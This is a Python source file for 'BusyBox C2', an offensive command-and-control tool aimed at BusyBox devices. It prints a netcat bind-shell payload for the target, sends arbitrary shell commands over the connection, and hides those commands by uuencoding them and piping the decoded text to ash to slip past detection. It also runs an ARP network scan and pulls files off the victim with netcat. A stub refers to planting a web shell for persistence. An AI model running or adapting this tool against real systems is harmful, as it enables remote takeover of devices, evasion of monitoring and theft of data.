from pyfiglet import Figlet
import socket, select, sys, time
import subprocess
import os
import random
import threading

class BusyBoxC2:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.prompt = " (busybox-c2)> "
        self.options = []

        self.show_banner()

        payload = "busybox nc -lp " + str(server_port) + " -e ash"
        print(f"[*] Payload to execute: {payload}\n")

        # Init socket
        self.socket = self.init_socket()

    def init_socket(self):
        print(f"[...] Initialization of TCP connection to {self.server_ip}:{self.server_port}")
        while True:
            try:
                self.socket = socket.create_connection((self.server_ip, self.server_port))
                print("[+] New connection !\n")
                break
            except KeyboardInterrupt:
                exit(0)
            except:
                pass

        self.socket.setblocking(False)
        return self.socket

    def show_banner(self):
        print(Figlet(font="slant").renderText("BusyBox C2"))

    def send_cmd(self, cmd):
        marker = "__END_OF_CMD_{}__".format(int(time.time()*1000))
        full_cmd = cmd + " ; echo " + marker
        self.socket.sendall((full_cmd + "\n").encode())
        buf = bytearray()
        printed = 0
        marker_b = marker.encode()
        while True:
            r, _, _ = select.select([self.socket], [], [], 0.5)
            if r:
                try:
                    chunk = self.socket.recv(4096)
                except BlockingIOError:
                    continue
                if not chunk:
                    if printed < len(buf):
                        sys.stdout.write(buf[printed:].decode(errors="replace"))
                        sys.stdout.flush()
                    return [bytes(buf)]
                buf.extend(chunk)
                idx = buf.find(marker_b)
                if idx != -1:
                    if printed < idx:
                        sys.stdout.write(buf[printed:idx].decode(errors="replace"))
                        sys.stdout.flush()
                    return [bytes(buf)]
                else:
                    if len(buf) > printed:
                        sys.stdout.write(buf[printed:].decode(errors="replace"))
                        sys.stdout.flush()
                        printed = len(buf)
            else:
                continue

    def cmd_obfuscation_ascii(self, raw_cmd):
        cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
        payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode -o /dev/stdout|ash"
        return payload

    def discover_arp_scan():
        net_ip = input("Network IP (ex: 192.168.1.0): ")
        range = input("Range (max: 254): ")

        cmd = "for i in $(seq 1 " + range + "); do arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"
        return cmd

    def download(self):
        file_name = input("File to download: ")
        listening_port = random.randint(1024, 65534)
        listener_cmd = "nc -lp " + str(listening_port) + " > " + file_name

        # Send command to get the file with a delay to wait sevrer availability
        cmd = "sleep 0.5; nc " + self.server_ip + " " + str(listening_port) + " < " + file_name
        if "obfuscation_ascii" in self.options:
            cmd = self.cmd_obfuscation_ascii(cmd)
        self.send_cmd(cmd)
        t = threading.Thread(target=self.send_cmd, args=(cmd,))
        t.start()

        # Launch listener to receive file
        os.system(listener_cmd)

        return listening_port, t
    
    def run(self):
        try:
            while True:
                try:
                    cmd = input(self.prompt)

                    match cmd.strip().lower():
                        case 'exit' | '/exit':
                            break
                        case '/options_disable' | '/o_d':
                            self.options.clear()
                            self.prompt = " (busybox-c2)> "
                        case '/options_show' | '/o_s' | '/options' | '/o':
                            for option in self.options:
                                print(f"{option} ")
                        case '/obfuscation_ascii' | '/obf_a':
                            self.options.append('obfuscation_ascii')
                            self.prompt = " (busybox-c2)[+]> "
                        case '/scan_discover':
                            cmd = self.discover_arp_scan()
                            if "obfuscation_ascii" in self.options:
                                cmd = self.cmd_obfuscation_ascii(cmd)
                            self.send_cmd(cmd)
                        case '/download':
                            # use netcat
                            self.download()
                        case '/persistence_webshell':
                            # launch web server and drop pwnyshell
                            pass
                        case _:
                            if "obfuscation_ascii" in self.options:
                                cmd = self.cmd_obfuscation_ascii(cmd)
                                print(f"Executed command: {cmd}\n")
                                #break

                            self.send_cmd(cmd)
                except (EOFError, KeyboardInterrupt):
                    break
                if not cmd:
                    continue
        finally:
            self.socket.close()